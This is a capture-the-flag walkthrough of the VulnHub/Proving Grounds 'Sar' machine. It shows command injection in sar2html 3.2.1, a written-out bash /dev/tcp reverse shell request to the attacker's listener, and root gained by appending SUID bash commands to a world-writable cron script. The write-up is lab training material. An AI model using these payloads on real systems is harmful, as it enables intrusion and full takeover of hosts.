---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/sar-1,425/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# enumeration

Performing a simple `nmap` scan to identify the attack surface of the target.

## nmap
```bash
$ nmap -Pn 192.168.173.35                                                                                                                                               130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-02 16:37 EST
Nmap scan report for 192.168.173.35
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## dirbusting port 80
```bash
$ gobuster dir -u http://192.168.173.35 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 5 -x php,txt,html -b 404
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.173.35
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/02/02 16:42:19 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/robots.txt           (Status: 200) [Size: 9]    
Progress: 38324 / 882244 (4.34%)                ^C
[!] Keyboard interrupt detected, terminating.
                                                 
===============================================================
2022/02/02 16:45:57 Finished
===============================================================
```
> `robots.txt` reveals that `sar2HTML` is available on the web server  
> Further investigations of the web application expose that `sar2html 3.2.1` is installed.
{: .prompt-info }

---

# exploitation
## remote code execution
### finding the exploit
```bash
$ searchsploit sar2html          
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                                                                                 | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                                                     | php/webapps/47204.txt
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> Using `/usr/share/exploitdb/exploits/php/webapps/47204.txt`
{: .prompt-info }

```bash
$ cat /usr/share/exploitdb/exploits/php/webapps/47204.txt
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute
the command you entered. After command injection press "select # host" then your command's
output will appear bottom side of the scroll screen. 
```

### get code execution
#### request
```http
GET /sar2HTML/index.php/index.php?plot=;whoami HTTP/1.1
Host: 192.168.173.35
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=di3j28bd8phhpgldrvdiuv7aiq
Connection: close
```

#### response
```http
HTTP/1.1 200 OK
Date: Wed, 02 Feb 2022 21:49:19 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 5793
Connection: close
Content-Type: text/html; charset=UTF-8

...
<option value=www-data>www-data</option>
...
```

> Yay! We got code execution :-)
{: .prompt-info }

---

# post exploitation

## reverse shell
### start listener on attacker machine
```bash
$ nc -lvp 80             
listening on [any] 80 ...
```

### send command to target
```http
GET /sar2HTML/index.php/index.php?plot=;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.173/80+0>%261' HTTP/1.1
Host: 192.168.173.35
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=di3j28bd8phhpgldrvdiuv7aiq
Connection: close
```

### catch connection from target
```bash
$ nc -lvp 80             
listening on [any] 80 ...
192.168.173.35: inverse host lookup failed: Unknown host
connect to [192.168.49.173] from (UNKNOWN) [192.168.173.35] 36990
bash: cannot set terminal process group (1046): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sar:/var/www/html/sar2HTML$ whoami
whoami
www-data
```

## privilege escalation
### `crontab` has `cronjob` executed by `root`
```bash
$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
```

### content of `/var/www/html/finally.sh`
```bash
www-data@sar:/var/www/html/sar2HTML$ cat /var/www/html/finally.sh
cat /var/www/html/finally.sh
#!/bin/sh

./write.sh
```

### permissions of `/var/www/html/finally.sh`
```bash
www-data@sar:/var/www/html/sar2HTML$ ls -lsah /var/www/html/finally.sh
ls -lsah /var/www/html/finally.sh
4.0K -rwxr-xr-x 1 root root 22 Oct 20  2019 /var/www/html/finally.sh
```

> No exploitable file permissions
{: .prompt-dangers }

Lets have a look at the file `write.sh` which is mentioned in the `finally.sh`.

### content of `/var/www/html/write.sh`
```bash
www-data@sar:/var/www/html/sar2HTML$ cat /var/www/html/write.sh
cat /var/www/html/write.sh
#!/bin/sh

touch /tmp/gateway
```

### permissions of `/var/www/html/write.sh`
```bash
www-data@sar:/var/www/html/sar2HTML$ ls -lsah /var/www/html/write.sh
ls -lsah /var/www/html/write.sh
4.0K -rwxrwxrwx 1 www-data www-data 30 Jul 24  2020 /var/www/html/write.sh
```

> File permissions are exploitable to get `root` access.
{: .prompt-info }

### add malicous code to `/var/www/html/write.sh` to copy `bash` with `SUID` flag to `/tmp`
```bash
www-data@sar:/var/www/html/sar2HTML$ cd /var/www/html
cd /var/www/html
www-data@sar:/var/www/html$ echo "cp /bin/bash /tmp/rootbash" >> write.sh
echo "cp /bin/bash /tmp/rootbash" >> write.sh
www-data@sar:/var/www/html$ echo "chmod +xs /tmp/rootbash" >> write.sh
echo "chmod +xs /tmp/rootbash" >> write.sh
www-data@sar:/var/www/html$ cat write.sh
cat write.sh
#!/bin/sh

touch /tmp/gateway
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

### wait 5 minutes and then look in `/tmp`

```bash
www-data@sar:/tmp$ ./rootbash -p
# whoami
root
```

> We got root!
{: .prompt-info }s

---

# get flags
## first flag
```bash
cd /home
ls
local.txt
love
cat local.txt
a******************************c
```

## second flag
```bash
cd /root
ls
proof.txt
root.txt
cat proof.txt
2******************************c
```

Pwned! <@:-) 
